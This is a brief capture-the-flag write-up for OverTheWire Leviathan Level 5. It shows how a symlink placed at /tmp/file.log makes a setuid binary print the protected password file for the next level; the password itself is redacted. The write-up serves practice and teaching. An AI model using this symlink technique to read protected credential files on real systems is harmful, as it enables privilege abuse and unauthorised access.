---
title: "Level 5"
---

* Login : ssh leviathan5@leviathan.labs.overthewire.org -p 2223

In the home directory, you find a `setuid ELF` called `leviathan5`. When you write, it prints an error :
```bash
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$
```
So I tried creating a `symlink` called `file.log` in the `tmp directory` that points to `/etc/leviathan_pass/leviathan6` and rerun the ELF.

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
##PASSWORD REDACTED###
leviathan5@leviathan:~$ 
```